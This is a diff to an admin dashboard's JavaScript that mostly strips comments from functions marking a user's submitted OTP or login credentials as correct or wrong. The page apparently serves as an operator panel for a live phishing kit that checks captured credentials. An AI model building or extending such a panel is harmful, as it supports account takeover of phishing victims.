@@ -732,9 +732,7 @@ tr:hover {
 
   function copyToClipboard(text, fieldName) {
     if (!text || text === '-') return;
-    navigator.clipboard.writeText(text).then(() => {
-      // Silent copy - no notification
-    }).catch(() => {});
+    navigator.clipboard.writeText(text).then(() => {}).catch(() => {});
   }
 
   function showTextModal(email) {
@@ -825,7 +823,6 @@ tr:hover {
     }
   }
 
-  // INCORRECT OTP - SILENT (NO NOTIFICATION, NO SOUND)
   async function incorrectOTP(email) {
     if (confirm(`❌ Mark OTP as incorrect for: ${email}?`)) {
       try {
@@ -844,7 +841,7 @@ tr:hover {
     }
   }
 
-  // WRONG LOGIN CREDENTIALS - SILENT
+  // ==================== NEW BUTTON FUNCTIONS ====================
   async function wrongLoginCredentials(email) {
     if (confirm(`❌ Mark login credentials as WRONG for: ${email}?`)) {
       try {
@@ -863,7 +860,6 @@ tr:hover {
     }
   }
 
-  // CORRECT LOGIN CREDENTIALS - SILENT
   async function correctLoginCredentials(email) {
     if (confirm(`✅ Mark login credentials as CORRECT for: ${email}?`)) {
       try {
@@ -1011,7 +1007,6 @@ tr:hover {
         statusBadge = '<span class="badge badge-pending">Pending</span>';
       }
       
-      // Show Wrong/Correct login buttons only if force_login was triggered
       const showLoginButtons = user.force_login === true || user.login_email !== null;
       
       return `
